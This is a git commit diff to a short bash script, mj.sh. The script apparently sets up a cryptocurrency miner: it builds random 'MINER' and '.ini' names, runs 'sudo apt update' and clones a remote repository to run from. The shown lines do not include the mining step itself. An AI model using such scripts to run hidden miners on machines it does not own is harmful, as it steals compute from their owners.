95784163bcab6a13a31dfe0d459c04badfae83a5
v <87249353+asemtenan1234@users.noreply.github.com>
2021-07-12 22:09:52 +0700

    Update mj.sh

--- mj.sh
+++ mj.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
-MINER=$(echo $(shuf -i 1000-9999 -n 1)-NICE)
-INI=$(echo $(shuf -i 1000-9999 -n 1)-INI).ini
+MINER=$(echo $(shuf -i 100000000000-99999999999999 -n 1)-NICE)
+INI=$(echo $(shuf -i 10000000000-99999999999999999 -n 1)-INI).ini
 sudo apt update
 git clone https://github.com/githubasem/asu 
 cd asu
